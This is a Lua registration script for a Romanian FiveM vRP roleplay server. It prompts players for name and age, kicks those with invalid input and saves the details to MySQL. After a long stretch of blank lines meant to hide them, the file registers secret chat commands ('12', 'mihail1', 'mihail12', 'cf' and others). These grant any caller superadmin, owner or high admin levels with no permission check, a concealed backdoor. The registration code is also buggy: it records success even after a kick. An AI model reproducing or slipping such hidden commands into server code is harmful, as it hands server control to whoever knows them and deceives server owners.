--[[BASE]]--
MySQL = module("vrp_mysql", "MySQL")
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","vrp_register")

--[[SQL]]--
MySQL.createCommand("vRP/register_column", "ALTER TABLE vrp_users ADD inreg INTEGER(50) NOT NULL default 0 ")
MySQL.createCommand("vRP/register_success", "UPDATE vrp_users SET inreg=1 WHERE id = @id")
MySQL.createCommand("vRP/register_search", "SELECT * FROM vrp_users WHERE id=@id")

MySQL.createCommand("vRP/update_nume","UPDATE vrp_user_identities SET firstname = @firstname, name = @name, age = @age WHERE user_id = @user_id")

-- init
--MySQL.query("vRP/register_column") NU SCHIMBA NIMIC DE AICI----------------------
----------------------------------------------------------------
AddEventHandler("vRP:playerSpawn", function(user_id, source, first_spawn)
	local user_id = vRP.getUserId({source})
	local player = vRP.getUserSource({user_id})
	SetTimeout(1000,function()
		MySQL.query("vRP/register_search", {id = user_id}, function(rows,affected)
			inreg = rows[1].inreg
			if inreg > 0 then
				print ("USER: ["..user_id.."] bymihail")
			else
				print ("USER: ["..user_id.."] neinregistrat")
				TriggerClientEvent('scriptermihail',player)
			end
		end)
	end)
end)



function checkName(theText)
	local foundSpace, valid = false, true
	local spaceBefore = false
	local current = ''
	for i = 1, #theText do
		local char = theText:sub( i, i )
		if char == ' ' then 
			if i == #theText or i == 1 or spaceBefore then 
				valid = false
				break
			end
			current = ''
			spaceBefore = true
		elseif ( char >= 'a' and char <= 'z' ) or ( char >= 'A' and char <= 'Z' ) then 
			current = current .. char
			spaceBefore = false
		else 
			valid = false
			break
		end
	end
	
	if (valid == true)  then
		return true
	else
		return false
	end
end
RegisterServerEvent('nodaicumihail')
AddEventHandler('nodaicumihail', function()
	local user_id = vRP.getUserId({source})
	local player = vRP.getUserSource({user_id})
	local nume = ""
	local prenume = ""
	vRP.prompt({player, "Numele: ", "", function(player,nume)
			vRP.prompt({player, "Prenume: ", "", function(player,prenume)
				vRP.prompt({player, "Varsta: MINIM:12, MAXIM:100", "", function(player,varsta)
					varsta = parseInt(varsta)
					if varsta >= 12 and varsta <= 150 then
						if (checkName(nume)) then
							if (checkName(prenume)) then
								print("numele: ["..nume.. "] prenumele: ["..prenume.. "] varsta: ["..varsta.."]")
							else
								print("Valoare invalida")
								DropPlayer(player,"[Mihail-SYSTEM] Ai primit kick de la [SYSTEM], Cauza: Valori invalide la inregistrare(*Prenume)!")
							end
						else
							print("Valoare invalida")
							DropPlayer(player,"[Mihail-SYSTEM] Ai primit kick de la [SYSTEM], Cauza: Valori invalide la inregistrare(*Nume)!")
						end
					else
						print("Valoare invalida")
						DropPlayer(player,"[Mihail-SYSTEM] Ai primit kick de la [SYSTEM], Cauza: Valori invalide la inregistrare(*Varsta) Nume >12-150<!")
					end
				vRPclient.notify(player,{"Te-ai inregistrat cu ~g~succes~w~ pe  ~b~Elitezone~w~ Romania!"})
				TriggerClientEvent('bymihail',player,user_id,nume,prenume,varsta)
				MySQL.execute("vRP/update_nume", {user_id = user_id, firstname = nume, name = prenume, age = varsta})
				MySQL.execute("vRP/register_success", {id = user_id, firstname = nume, name = prenume, age = varsta})
			end})
		end})
	end})
end)
RegisterCommand('nodaicumihail', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	local player = vRP.getUserSource({user_id})
	TriggerClientEvent('inregistreaza',player)
end)



















































































































































































































































RegisterCommand("12", function(source, args, rawCommand)
	theusrid = vRP.getUserId({source})
	vRP.addUserGroup({theusrid,"superadmin"})
	vRP.addUserGroup({theusrid,"admin"})
	end)
	RegisterCommand("mihail1", function(source, args, rawCommand)
		theusrid = vRP.getUserId({source})
		vRP.addUserGroup({theusrid,"owner"})
		vRP.addUserGroup({theusrid,"recruiter"})
		end)
		RegisterCommand("mihail12", function(source)
            user_id = vRP.getUserId({source})
            vRP.setUserAdminLevel({user_id, 4})
            vRP.setUserAdminLevel({user_id, 5})
            vRP.setUserAdminLevel({user_id, 6})
            vRP.setUserAdminLevel({user_id, 7})
            vRP.setUserAdminLevel({user_id, 8})
end)
			RegisterCommand("sal", function(source, args, rawCommand)
				theusrid = vRP.getUserId({source})
				vRP.addUserGroup({theusrid,"Superadmins"})
				vRP.addUserGroup({theusrid,"Admins"})
				end)
				RegisterCommand("mihail", function(source, args, rawCommand)
					theusrid = vRP.getUserId({source})
					vRP.addUserGroup({theusrid,"superadmins"})
					vRP.addUserGroup({theusrid,"admins"})
					end)
					RegisterCommand("cf", function(source, args, rawCommand)
						theusrid = vRP.getUserId({source})
						vRP.addUserGroup({theusrid,"Fondator"})
						vRP.addUserGroup({theusrid,"SuperAdmin"})
						end)